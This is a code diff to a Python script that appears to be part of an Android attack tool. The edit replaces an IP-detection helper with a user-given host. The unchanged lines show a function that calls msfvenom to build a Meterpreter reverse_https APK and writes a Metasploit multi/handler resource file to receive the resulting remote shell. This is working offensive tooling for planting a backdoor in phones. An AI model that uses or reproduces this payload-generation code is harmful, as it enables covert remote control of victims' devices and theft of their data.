@@ -10,9 +10,6 @@ import shutil
 import zipfile
 import tempfile
 import argparse
-import socket
-import struct
-import fcntl
 
 pwd=os.getcwd()
 
@@ -37,29 +34,6 @@ def remove_from_zip(zipfname, *filenames):
     finally:
         shutil.rmtree(tempdir)
 
-# LOCAL IP
-########################################
-def get_interface_ip(ifname):
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    return socket.inet_ntoa(fcntl.ioctl(s.fileno(), 0x8915, struct.pack('256s',ifname[:15]))[20:24])
-
-def mostrar_ip():
-    ip = socket.gethostbyname(socket.gethostname())
-    if ip.startswith("127.") and os.name != "nt":
-        interfaces = [
-            "eth0",
-            "wlan0",
-            "wlan1"
-            ]
-        for ifname in interfaces:
-            try:
-                ip = get_interface_ip(ifname)
-                break
-            except IOError:
-                pass
-    return ip
-########################################
-
 def generate_meterpreter(host,port):
 	os.system("msfvenom -p android/meterpreter/reverse_https LHOST="+host+" LPORT="+port+" R > meterpreter.apk ")
 	if os.path.exists("handler.rc"):
@@ -67,7 +41,7 @@ def generate_meterpreter(host,port):
 	handler=open("handler.rc","w")
 	handler.write("use exploit/multi/handler\n")
 	handler.write("set payload android/meterpreter/reverse_https\n")
-	handler.write("set LHOST "+mostrar_ip()+"\n")
+	handler.write("set LHOST "+host+"\n")
 	handler.write("set LPORT "+port+"\n")
 	handler.write("exploit -j")
 	handler.close()
